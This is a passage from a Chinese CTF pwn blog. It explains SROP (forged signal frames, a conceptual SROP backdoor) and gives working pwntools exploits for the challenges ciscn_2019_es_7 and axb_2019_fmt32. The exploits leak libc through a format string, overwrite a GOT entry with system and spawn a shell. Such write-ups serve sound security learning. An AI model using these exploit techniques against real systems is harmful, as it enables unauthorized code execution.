class="token keyword">long</span> eflags<span class="token punctuation">;</span>  <span class="token keyword">unsigned</span> <span class="token keyword">long</span> esp_at_signal<span class="token punctuation">;</span>  <span class="token keyword">unsigned</span> <span class="token keyword">short</span> ss<span class="token punctuation">,</span> __ssh<span class="token punctuation">;</span>  <span class="token keyword">struct</span> _fpstate <span class="token operator">*</span> fpstate<span class="token punctuation">;</span>  <span class="token keyword">unsigned</span> <span class="token keyword">long</span> oldmask<span class="token punctuation">;</span>  <span class="token keyword">unsigned</span> <span class="token keyword">long</span> cr2<span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">;</span></code></pre><pre class=" language-c"><code class="language-c">x64<span class="token keyword">struct</span> _fpstate<span class="token punctuation">{</span>  <span class="token comment" spellcheck="true">/* FPU environment matching the 64-bit FXSAVE layout.  */</span>  __uint16_t        cwd<span class="token punctuation">;</span>  __uint16_t        swd<span class="token punctuation">;</span>  __uint16_t        ftw<span class="token punctuation">;</span>  __uint16_t        fop<span class="token punctuation">;</span>  __uint64_t        rip<span class="token punctuation">;</span>  __uint64_t        rdp<span class="token punctuation">;</span>  __uint32_t        mxcsr<span class="token punctuation">;</span>  __uint32_t        mxcr_mask<span class="token punctuation">;</span>  <span class="token keyword">struct</span> _fpxreg    _st<span class="token punctuation">[</span><span class="token number">8</span><span class="token punctuation">]</span><span class="token punctuation">;</span>  <span class="token keyword">struct</span> _xmmreg    _xmm<span class="token punctuation">[</span><span class="token number">16</span><span class="token punctuation">]</span><span class="token punctuation">;</span>  __uint32_t        padding<span class="token punctuation">[</span><span class="token number">24</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">;</span><span class="token keyword">struct</span> sigcontext<span class="token punctuation">{</span>  __uint64_t r8<span class="token punctuation">;</span>  __uint64_t r9<span class="token punctuation">;</span>  __uint64_t r10<span class="token punctuation">;</span>  __uint64_t r11<span class="token punctuation">;</span>  __uint64_t r12<span class="token punctuation">;</span>  __uint64_t r13<span class="token punctuation">;</span>  __uint64_t r14<span class="token punctuation">;</span>  __uint64_t r15<span class="token punctuation">;</span>  __uint64_t rdi<span class="token punctuation">;</span>  __uint64_t rsi<span class="token punctuation">;</span>  __uint64_t rbp<span class="token punctuation">;</span>  __uint64_t rbx<span class="token punctuation">;</span>  __uint64_t rdx<span class="token punctuation">;</span>  __uint64_t rax<span class="token punctuation">;</span>  __uint64_t rcx<span class="token punctuation">;</span>  __uint64_t rsp<span class="token punctuation">;</span>  __uint64_t rip<span class="token punctuation">;</span>  __uint64_t eflags<span class="token punctuation">;</span>  <span class="token keyword">unsigned</span> <span class="token keyword">short</span> cs<span class="token punctuation">;</span>  <span class="token keyword">unsigned</span> <span class="token keyword">short</span> gs<span class="token punctuation">;</span>  <span class="token keyword">unsigned</span> <span class="token keyword">short</span> fs<span class="token punctuation">;</span>  <span class="token keyword">unsigned</span> <span class="token keyword">short</span> __pad0<span class="token punctuation">;</span>  __uint64_t err<span class="token punctuation">;</span>  __uint64_t trapno<span class="token punctuation">;</span>  __uint64_t oldmask<span class="token punctuation">;</span>  __uint64_t cr2<span class="token punctuation">;</span>  __extension__ <span class="token keyword">union</span>    <span class="token punctuation">{</span>      <span class="token keyword">struct</span> _fpstate <span class="token operator">*</span> fpstate<span class="token punctuation">;</span>      __uint64_t __fpstate_word<span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">;</span>  __uint64_t __reserved1 <span class="token punctuation">[</span><span class="token number">8</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">;</span></code></pre><h3 id="机制缺陷"><a href="#机制缺陷" class="headerlink" title="机制缺陷"></a>机制缺陷</h3><ul><li>这个<code>Signal Frame</code>是被保存在用户进程的地址空间中的，是用户进程可读写的\</li><li>内核并没有将保存的过程和恢复的过程进行一个比较，也就是说，在<code>sigreturn</code>这个系统调用的处理函数中，内核并没有判断当前的这个`Signal Frame`就是之前内核为用户进程保存的那个`Signal Frame`<h4 id="一个最简单的攻击"><a href="#一个最简单的攻击" class="headerlink" title="一个最简单的攻击"></a>一个最简单的攻击</h4>如果攻击者可以控制用户进程的栈，那么它就可以伪造一个<code>Signal Frame</code>，如下图所示：<br><img src="https://s1.ax1x.com/2020/09/30/0n4px1.png" alt=""><br>伪造的Signal Frame中：</li><li>rdi赋值为/bin/sh地址</li><li>rax赋值为execv系统调用号59</li><li>rip赋值为syscall指令地址</li><li>我觉得还要有rsi=0，rdx=0<br>最后，将<code>rt_sigreturn</code>手动设置成<code>sigreturn</code>系统调用的内存地址。那么，当这个伪造的<code>sigreturn</code>系统调用返回之后，相应的寄存器就被设置成了攻击者可以控制的值，在此例子中sigreturn一但执行完毕返回到用户态，寄存器就会被设置成攻击者所修改的值，即调用execv打开一个shell</li></ul><p>这是一个最简单的攻击。在这个攻击中，有4个前提条件：</p><ul><li>攻击者可以通过stack overflow等漏洞控制栈上的内容；</li><li>需要知道栈的地址（比如需要知道自己构造的字符串<code>/bin/sh</code>的地址）</li><li>需要知道<code>syscall</code>指令在内存中的地址；</li><li>需要知道<code>sigreturn</code>系统调用的内存地址。</li></ul><h2 id="使用pwntools-模块进行攻击"><a href="#使用pwntools-模块进行攻击" class="headerlink" title="使用pwntools 模块进行攻击"></a>使用pwntools 模块进行攻击</h2><p>先指定指定机器的运行模式：context(os=’linux’,arch=’adm64’)<br>使用SigreturnFrame()获取frame结构体，然后进行赋值即可</p><h3 id="EXP-1"><a href="#EXP-1" class="headerlink" title="EXP"></a>EXP</h3><pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span><span class="token operator">*</span>context<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">'debug'</span>context<span class="token punctuation">(</span>os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">,</span>arch<span class="token operator">=</span><span class="token string">'amd64'</span><span class="token punctuation">)</span>sh <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">'./ciscn_2019_es_7'</span><span class="token punctuation">)</span>payload <span class="token operator">=</span> <span class="token string">'/bin/sh\x00'</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">0x10</span><span class="token punctuation">,</span><span class="token string">'A'</span><span class="token punctuation">)</span>payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0x000040051D</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#jmp to start</span>payload <span class="token operator">+=</span> <span class="token string">'A'</span><span class="token operator">*</span><span class="token number">6</span> <span class="token operator">+</span> <span class="token string">':'</span>sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>sh<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'AAA:\n'</span><span class="token punctuation">)</span>stack_addr <span class="token operator">=</span> u64<span class="token punctuation">(</span>sh<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token string">'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">0x1ff58</span><span class="token keyword">print</span> hex<span class="token punctuation">(</span>stack_addr<span class="token punctuation">)</span>bin_sh_addr <span class="token operator">=</span> stack_addr <span class="token operator">+</span> <span class="token number">0x1fe20</span>pop_rdi_ret <span class="token operator">=</span> <span class="token number">0x00000000004005a3</span>pop_rsi_r15_ret <span class="token operator">=</span> <span class="token number">0x00000000004005a1</span>mov_rax_3bh <span class="token operator">=</span> <span class="token number">0x04004E2</span>ret <span class="token operator">=</span> <span class="token number">0x00000000004003a9</span>syscall <span class="token operator">=</span> <span class="token number">0x0000000000400501</span>mov_rax_ret <span class="token operator">=</span> <span class="token number">0x00000000004004da</span>sigframe <span class="token operator">=</span> SigreturnFrame<span class="token punctuation">(</span><span class="token punctuation">)</span>sigframe<span class="token punctuation">.</span>rax <span class="token operator">=</span> constants<span class="token punctuation">.</span>SYS_execve <span class="token comment" spellcheck="true">#指定系统调用号 59  </span>sigframe<span class="token punctuation">.</span>rdi <span class="token operator">=</span> bin_sh_addr <span class="token comment" spellcheck="true">#指定参数rdi为bin sh地址</span>sigframe<span class="token punctuation">.</span>rsi <span class="token operator">=</span> <span class="token number">0x0</span> <span class="token comment" spellcheck="true">#指定参数rsi为0</span>sigframe<span class="token punctuation">.</span>rdx <span class="token operator">=</span> <span class="token number">0x0</span> <span class="token comment" spellcheck="true">#指定参数rdx为0</span>sigframe<span class="token punctuation">.</span>rip <span class="token operator">=</span> syscall <span class="token comment" spellcheck="true">#指定rip为syscall</span>payload <span class="token operator">=</span> <span class="token string">'/bin/sh\x00'</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">0x10</span><span class="token punctuation">,</span><span class="token string">'A'</span><span class="token punctuation">)</span>payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>mov_rax_ret<span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#先将rax赋值为15</span>payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>syscall<span class="token punctuation">)</span>  <span class="token comment" spellcheck="true">#进行系统调用sigreturn，然而程序并没有什么signal所以就直接返回，对sigframe 进行恢复，因为sigframe.rip = syscall所以将执行execve</span>payload <span class="token operator">+=</span> str<span class="token punctuation">(</span>sigframe<span class="token punctuation">)</span>sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>sh<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><h2 id="MASS"><a href="#MASS" class="headerlink" title="MASS"></a>MASS</h2><h4 id="利用SROP构造系统调用串"><a href="#利用SROP构造系统调用串" class="headerlink" title="利用SROP构造系统调用串"></a>利用SROP构造系统调用串</h4><p>像上面那样布置，只能进行一次系统调用，如果要进行多次系统调用就需要额外添加一个对栈指针<code>rsp</code>的控制就行了。如下<br><img src="https://s1.ax1x.com/2020/09/30/0n4S2R.png" alt=""><br>该示意图在第一次系统调用socket函数后ret到address2，然后进行第二次系统调用bind函数，继续ret到address3……也就是要在syscall 后面加上一个ret指令来控制程序流程<br>所以想要构造SROP系统调用串就需要两个很重要的gadgets：sigreturn  ，syscall; ret<br>对于sigreturn这个系统调用和别的系统调用有一个不同的地方，即一般的应用程序不会主动调用它，而是像之前介绍的，由内核将相应地址填到栈上，使得应用进程被动地调用。因此在系统中一般会有一段代码专门用来调用<code>sigreturn</code>。在不同的类UNIX系统中，这段代码会出现在不同的位置，如下图所示：<br><img src="https://s1.ax1x.com/2020/09/30/0nhzG9.png" alt=""><br>其中在<code>Linux &lt; 3.11 ARM</code>（也就是大部分现在Android所使用的内核），以及<code>FreeBSB 9.2 x86_64</code>，都可以在固定的内存地址中找到这个gadget，而在其它系统中，一般被保存在<code>libc</code>库的内存中，如果有ASLR保护的话似乎没有那么容易找到。<br>Linux &lt; 3.3 x86_64（在 Debian 7.0， Ubuntu Long Term Support， CentOS 6 系统中默认内核），可以直接在 vsyscall 中的固定地址处找到 syscall&amp;return 代码片段。如下<br><img src="https://s1.ax1x.com/2020/09/30/0n4iqK.png" alt=""><br>其中<code>vsyscall</code>是用来加速<code>time()</code>，<code>gettimeofday()</code>和<code>getcpu()</code>这三个系统调用的机制，虽然现在已经被<code>vsyscall-emulate</code>和<code>vdso</code>机制所代替，但在稍微比较早一点的内核中依然是被默认支持的。<br>除了上面提到的这两个可能存在在固定地址的gadgets之外，在其它系统中，这两个gadgets似乎并没有那么容易找到，特别是在有ALSR保护的系统中。但是，如果我们将其和传统的ROP来进行比较的话，就可以发现，它把整个攻击的代价拉低了一个档次。</p><h4 id="sigreturn更好的调用方法"><a href="#sigreturn更好的调用方法" class="headerlink" title="sigreturn更好的调用方法"></a>sigreturn更好的调用方法</h4><p>那么其实这个单独的gadget并不是必须的。因为我们可以将<code>rax</code>寄存器设置成15（sigreturn的系统调用号），然后调用一个<code>syscall</code>，效果和调用一个<code>sigreturn</code>是一样一样的。那么，问题就从“如何找到一个<code>sigreturn</code> gadget”变成了<strong>“如何控制寄存器<code>rax</code>的值”</strong>。而<code>rax</code>这个寄存器非常特殊，它除了被用来指定系统调用的调用号之外，也是函数返回值最后存放的地方。因此，我们可以利用控制函数返回值来控制<code>rax</code>寄存器的值，具体的做法因人而异。<strong>比如利用read函数读取不同个数的字符来控制rax的值</strong></p><h3 id="SROP应用场景"><a href="#SROP应用场景" class="headerlink" title="SROP应用场景"></a>SROP应用场景</h3><p>利用SROP构造一些列系统调用，利用这些系统调用我们可以做很多事。</p><h4 id="应用场景一：后门（Backdoor）"><a href="#应用场景一：后门（Backdoor）" class="headerlink" title="应用场景一：后门（Backdoor）"></a>应用场景一：后门（Backdoor）</h4><p>可以通过这种方法构造一个后门</p><blockquote><p>后门的意思就是攻击者在系统中隐藏一个可以被触发的点，当某些比较少见的特定操作发生之后，会触发一个动作，这个动作一般是打开一个端口让攻击者通过网络连接进系统，从而对系统进行控制。后门最重要的特点是隐蔽，不容易被杀毒软件检查出来。所以说如果后门是一段可执行代码，那么就很容易被杀毒软件检测到，而如果后门是隐藏在数据域中，那么就能做到非常隐蔽<br>SROP就为其提供了一个强有力的工具：system call chain。整个过程如下图所示：<br><img src="https://s1.ax1x.com/2020/09/30/0n4kVO.png" alt=""><br>在这个过程中，攻击者利用<code>inotify API</code>来监控一个文件，当这个文件被访问（比如攻击者在发起的请求中读取这个文件的内容），则后续的系统调用链被触发，打开一个socket，等待连接。同时通过一个<code>alarm</code>系统调用设置一个定时器，如果在5秒钟没有人对这个socket发起连接请求，则将其关闭，否则建立连接，并调用<code>execve</code>系统调用打开一个shell。<br>这就是一个典型的后门，可以用SROP完成。</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> CTF-PWN </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 原理学习 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>axb_2019_fmt32</title>
      <link href="/2020/09/27/axb-2019-fmt32/"/>
      <url>/2020/09/27/axb-2019-fmt32/</url>
      
        <content type="html"><![CDATA[<h2 id="checksec"><a href="#checksec" class="headerlink" title="checksec"></a>checksec</h2><pre class=" language-java"><code class="language-java">matrix<span class="token annotation punctuation">@ubuntu</span><span class="token operator">:</span><span class="token operator">~</span><span class="token operator">/</span>PWN<span class="token operator">/</span>BUU$ checksec axb_2019_fmt32<span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> <span class="token string">'/home/matrix/PWN/BUU/axb_2019_fmt32'</span>    Arch<span class="token operator">:</span>     i386<span class="token operator">-</span><span class="token number">32</span><span class="token operator">-</span>little    RELRO<span class="token operator">:</span>    Partial RELRO    Stack<span class="token operator">:</span>    No canary found    NX<span class="token operator">:</span>       NX enabled    PIE<span class="token operator">:</span>      No <span class="token function">PIE</span> <span class="token punctuation">(</span><span class="token number">0x8048000</span><span class="token punctuation">)</span>    只开启了NX、 matrix<span class="token annotation punctuation">@ubuntu</span><span class="token operator">:</span><span class="token operator">~</span><span class="token operator">/</span>PWN<span class="token operator">/</span>BUU$ <span class="token punctuation">.</span>/axb_2019_fmt32 Hello<span class="token punctuation">,</span>I am a computer Repeater updated<span class="token punctuation">.</span>After a lot of machine learning<span class="token punctuation">,</span>I know that the essence of man is a reread machine<span class="token operator">!</span>So I'll answer whatever you say<span class="token operator">!</span>Please tell me<span class="token operator">:</span><span class="token operator">%</span>pRepeater<span class="token operator">:</span><span class="token number">0x804888d</span>Please tell me<span class="token operator">:</span>Alarm clock格式化字符串漏洞</code></pre><h2 id="IDA"><a href="#IDA" class="headerlink" title="IDA"></a>IDA</h2><pre class=" language-c"><code class="language-c"><span class="token keyword">int</span> __cdecl __noreturn <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>argv<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>envp<span class="token punctuation">)</span><span class="token punctuation">{</span>  <span class="token keyword">char</span> s<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [esp+Fh] [ebp-239h]</span>  <span class="token keyword">char</span> format<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [esp+110h] [ebp-138h]</span>  <span class="token keyword">unsigned</span> <span class="token keyword">int</span> v5<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [esp+23Ch] [ebp-Ch]</span>  v5 <span class="token operator">=</span> <span class="token function">__readgsdword</span><span class="token punctuation">(</span><span class="token number">0x14u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">setbuf</span><span class="token punctuation">(</span><span class="token constant">stdout</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">setbuf</span><span class="token punctuation">(</span><span class="token constant">stdin</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">setbuf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">puts</span><span class="token punctuation">(</span>    <span class="token string">"Hello,I am a computer Repeater updated.\n"</span>    <span class="token string">"After a lot of machine learning,I know that the essence of man is a reread machine!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"So I'll answer whatever you say!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">while</span> <span class="token punctuation">(</span> <span class="token number">1</span> <span class="token punctuation">)</span>  <span class="token punctuation">{</span>    <span class="token function">alarm</span><span class="token punctuation">(</span><span class="token number">3u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">memset</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>s<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0x101u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">memset</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>format<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0x12Cu</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Please tell me:"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">read</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>s<span class="token punctuation">,</span> <span class="token number">0x100u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">sprintf</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>format<span class="token punctuation">,</span> <span class="token string">"Repeater:%s\n"</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>s<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token function">strlen</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>format<span class="token punctuation">)</span> <span class="token operator">></span> <span class="token number">0x10E</span> <span class="token punctuation">)</span>      <span class="token keyword">break</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>format<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment" spellcheck="true">//利用点</span>  <span class="token punctuation">}</span>  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"what you input is really long!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>没有system，/bin/sh。 后门</p><h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><p>利用fmt泄露函数地址获取libc版本，system真实地址 ，再次利用写入strlen_got表中，然后输入/bin/sh即可</p><h2 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h2><pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span><span class="token operator">*</span><span class="token keyword">from</span> LibcSearcher <span class="token keyword">import</span><span class="token operator">*</span>context<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">'debug'</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'axb_2019_fmt32'</span><span class="token punctuation">)</span>puts_got <span class="token operator">=</span> elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">'puts'</span><span class="token punctuation">]</span>strlen_got <span class="token operator">=</span> <span class="token punctuation">(</span>elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">'strlen'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#sh = process('./axb_2019_fmt32')</span>sh <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">'node3.buuoj.cn'</span><span class="token punctuation">,</span><span class="token number">26280</span><span class="token punctuation">)</span>payload <span class="token operator">=</span><span class="token string">'AAA'</span><span class="token operator">+</span>p32<span class="token punctuation">(</span>puts_got<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'%75$s'</span>sh<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'Please tell me:'</span><span class="token punctuation">,</span>payload<span class="token punctuation">)</span>sh<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'AAA'</span><span class="token punctuation">)</span>sh<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span>puts_addr <span class="token operator">=</span> u32<span class="token punctuation">(</span>sh<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">print</span> type<span class="token punctuation">(</span>puts_addr<span class="token punctuation">)</span>libc <span class="token operator">=</span> LibcSearcher<span class="token punctuation">(</span><span class="token string">'puts'</span><span class="token punctuation">,</span>puts_addr<span class="token punctuation">)</span>libc_addr <span class="token operator">=</span> puts_addr <span class="token operator">-</span> libc<span class="token punctuation">.</span>dump<span class="token punctuation">(</span><span class="token string">'puts'</span><span class="token punctuation">)</span>system_addr <span class="token operator">=</span> <span class="token punctuation">(</span>libc_addr <span class="token operator">+</span> libc<span class="token punctuation">.</span>dump<span class="token punctuation">(</span><span class="token string">'system'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#地址泄露</span><span class="token keyword">print</span> hex<span class="token punctuation">(</span>system_addr<span class="token punctuation">)</span>payload1 <span class="token operator">=</span> <span class="token string">'B'</span> <span class="token comment" spellcheck="true">#10 ge  fmtstr_payload(offset, writes, numbwritten=0, write_size='byte')</span>payload1 <span class="token operator">+=</span> fmtstr_payload<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token punctuation">{</span>strlen_got<span class="token punctuation">:</span>system_addr<span class="token punctuation">}</span><span class="token punctuation">,</span>numbwritten<span class="token operator">=</span><span class="token number">10</span><span class="token punctuation">)</span><span class="token keyword">print</span> payload1sh<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'Please tell me:'</span><span class="token punctuation">,</span>payload1<span class="token punctuation">)</span>sh<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'Please tell me:'</span><span class="token punctuation">,</span><span class="token string">'||sh'</span><span class="token punctuation">)</span>  <span class="token operator">//</span>strlen的参数里面还有Repeater<span class="token punctuation">:</span>所以得用<span class="token operator">|</span><span class="token operator">|</span>sh  或者<span class="token punctuation">;</span><span class="token operator">/</span>bin<span class="token operator">/</span>shsh<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><p>注意：</p><ul><li>这里使用了pwntools的fmtstr_payload模块<ul><li>fmtstr_payload(offset, writes, numbwritten=0, write_size=’byte’)这是完整形式，offset：偏移  writes：{addr1:adddr2} numbwritten：已经被输出的字符（这里已经输出了10个） write_size=’byte’：参数表示写入方式，是按字节（byte）、按双字节（short）还是按四字节（int），对应着hhn、hn和n，默认值是byte，即按hhn写。</li></ul></li><li>我们输入的数据在栈中并没有对齐，所以payload先放一个B来对齐</li></ul><p>不用fmtstr_payload，构造payload：</p><h3 id="EXP-1"><a href="#EXP-1" class="headerlink" title="EXP"></a>EXP</h3><pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span><span class="token operator">*</span><span class="token keyword">from</span> LibcSearcher <span class="token keyword">import</span><span class="token operator">*</span>context<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">'debug'</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'axb_2019_fmt32'</span><span class="token punctuation">)</span>puts_got <span class="token operator">=</span> elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">'puts'</span><span class="token punctuation">]</span>strlen_got <span class="token operator">=</span> <span class="token punctuation">(</span>elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">'strlen'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#sh = process('./axb_2019_fmt32')</span>sh <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">'node3.buuoj.cn'</span><span class="token punctuation">,</span><span class="token number">26280</span><span class="token punctuation">)</span>payload <span class="token operator">=</span><span class="token string">'AAA'</span><span class="token operator">+</span>p32<span class="token punctuation">(</span>puts_got<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'%75$s'</span>sh<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'Please tell me:'</span><span class="token punctuation">,</span>payload<span class="token punctuation">)</span>sh<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'AAA'</span><span class="token punctuation">)</span>sh<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span>puts_addr <span class="token operator">=</span> u32<span class="token punctuation">(</span>sh<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">print</span> type<span class="token punctuation">(</span>puts_addr<span class="token punctuation">)</span>libc <span class="token operator">=</span> LibcSearcher<span class="token punctuation">(</span><span class="token string">'puts'</span><span class="token punctuation">,</span>puts_addr<span class="token punctuation">)</span>libc_addr <span class="token operator">=</span> puts_addr <span class="token operator">-</span> libc<span class="token punctuation">.</span>dump<span class="token punctuation">(</span><span class="token string">'puts'</span><span class="token punctuation">)</span>system_addr <span class="token operator">=</span> <span class="token punctuation">(</span>libc_addr <span class="token operator">+</span> libc<span class="token punctuation">.</span>dump<span class="token punctuation">(</span><span class="token string">'system'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>system_high <span class="token operator">=</span> system_addr <span class="token operator">>></span> <span class="token number">16</span><span class="token keyword">print</span> hex<span class="token punctuation">(</span>system_high<span class="token punctuation">)</span>system_low <span class="token operator">=</span> system_addr <span class="token operator">&amp;</span> <span class="token number">0xffff</span><span class="token keyword">print</span> hex<span class="token punctuation">(</span>system_low<span class="token punctuation">)</span>differe <span class="token operator">=</span> system_high <span class="token operator">-</span> system_low<span class="token keyword">print</span> hex<span class="token punctuation">(</span>system_addr<span class="token punctuation">)</span>payload1 <span class="token operator">=</span> <span class="token string">'B'</span> <span class="token comment" spellcheck="true">#10 ge  fmtstr_payload(offset, writes, numbwritten=0, write_size='byte')</span><span class="token comment" spellcheck="true">#payload += fmtstr_payload(8,{strlen_got:system_addr},numbwritten=10)</span>aim_strlen_low <span class="token operator">=</span> strlen_gotaim_strlen_high <span class="token operator">=</span> strlen_got <span class="token operator">+</span> <span class="token number">2</span>payload1 <span class="token operator">+=</span> p32<span class="token punctuation">(</span>aim_strlen_low<span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#off = 8</span>payload1 <span class="token operator">+=</span> p32<span class="token punctuation">(</span>aim_strlen_high<span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#0ff = 9</span>payload1 <span class="token operator">+=</span> <span class="token string">'%{}c%8$hn%{}c%9$hn'</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span><span class="token punctuation">(</span>system_low<span class="token number">-18</span><span class="token punctuation">)</span><span class="token punctuation">,</span>differe<span class="token punctuation">)</span><span class="token keyword">print</span> payload1sh<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'Please tell me:'</span><span class="token punctuation">,</span>payload1<span class="token punctuation">)</span>sh<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'Please tell me:'</span><span class="token punctuation">,</span><span class="token string">';/bin/sh'</span><span class="token punctuation">)</span>sh<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><p>结果：</p><pre class=" language-java"><code class="language-java"><span class="token punctuation">[</span>DEBUG<span class="token punctuation">]</span> Sent <span class="token number">0x9</span> bytes<span class="token operator">:</span>    <span class="token string">';/bin/sh\n'</span><span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> Switching to interactive mode<span class="token punctuation">[</span>DEBUG<span class="token punctuation">]</span> Received <span class="token number">0x1c</span> bytes<span class="token operator">:</span>    <span class="token string">'sh: 1: Repeater:: not found\n'</span></code></pre>]]></content>
      
      
      <categories>
          
          <category> CTF-PWN </category>
          
      </categories>
      
      
